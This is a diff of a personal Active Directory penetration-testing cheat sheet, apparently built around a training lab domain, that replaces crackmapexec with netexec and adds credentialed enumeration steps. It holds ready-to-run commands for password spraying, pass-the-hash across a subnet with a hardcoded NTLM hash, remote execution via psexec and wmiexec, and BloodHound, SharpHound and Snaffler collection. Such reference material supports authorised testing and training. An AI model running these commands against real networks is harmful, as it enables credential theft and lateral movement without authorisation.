@@ -1,20 +1,48 @@
 #Enumerating & retriving password Policies 
-crackmapexec smb $(vselector dcip) -u $(vselector vuser) -p $(vselector vpass) --pass-pol
+netexec smb $(vselector dcip) -u $(vselector vuser) -p $(vselector vpass) --pass-pol
 rpcclient -U "" -N $(vselector dcip)
 enum4linux -P $(vselector dcip)
 ldapsearch -h $(vselector dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 #User Enumeration 
 enum4linux -U $(vselector dcip)  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-crackmapexec smb $(vselector dcip) --users
+netexec smb $(vselector dcip) --users
 ldapsearch -h $(vselector dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 ./windapsearch.py --dc-ip $(vselector dcip) -u "" -U
 kerbrute userenum -d $(vselector dcname) --dc $(vselector dcip) /opt/jsmith.txt 
-crackmapexec smb $(vselector dcname) -u $(vselector vuser) -p $(vselector vpass) --users
+netexec smb $(vselector dcname) -u $(vselector vuser) -p $(vselector vpass) --users
 #password Spraying from Linux Host 
 for u in $(cat $(vselector usernamepath));do rpcclient -U "$u%$(vselector spraypass)" -c "getusername;quit" $(vselector dcname) | grep Authority; done
 kerbrute passwordspray -d $(vselector dname) --dc $(vselector dcip) $(vselector usernamepath)  $(vselector spraypass)
-crackmapexec smb $(vselector dcip) -u $(vselector usernamepath) -p $(vselector sprypass) | grep +
-crackmapexec smb --local-auth $(vselector tsubnet) -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+netexec smb $(vselector dcip) -u $(vselector usernamepath) -p $(vselector sprypass) | grep +
+netexec smb --local-auth $(vselector tsubnet) -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 # Internal Password Spraying - from Windows
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue 
-
+#Cred Enumeration - from Linux
+netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --users
+netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --groups
+netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --loggedon-users
+netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --shares 
+netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) -M spider_plus --share 'Department Shares' 
+smbmap -u $(vselector dcuser) -p $(vselector dcpass) -d $(vselector dcname) -H $(vselector dcip)
+smbmap -u $(vselector dcuser) -p $(vselector dcpass) -d $(vselector dcname) -H $(vselector dcip) -R 'Department Shares' --dir-only
+rpcclient -U "" -N $(vselector dcip)
+psexec.py $(vselector dcname)/$(vselector dcuser):'$(vselector dcpass)'@$(vselector dcip) 
+wmiexec.py $(vselector dcname)/$(vselector dcuser):'$(vselector dcpass)'@$(vselector dcip) 
+bloodhound-python -u '$(vselector dcuser)' -p '$(vselector dcpass)' -d $(vselector dcname) -dc $(vselector dcname) -ns $(vselector dcip) -c All --auth-method ntlm --zip 
+bloodhound-python -u '$(vselector dcuser)' -p '$(vselector dcpass)' -d $(vselector dcname) -dc $(vselector dcname) -ns $(vselector dcip) -c All --zip
+#creds Enumeration - from windows 
+Get-Module
+Get-ADDomain
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+Get-ADTrust -Filter *
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+Get-ADGroupMember -Identity "Backup Operators"
+Get-DomainUser -Identity $(vselector dcuser) -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+Get-DomainTrustMapping
+Get-DomainTrustMapping
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
+.\SharpHound.exe -c All --zipfilename ILFREIGHT <-> to collect all the data from ad of course this work with windows only 
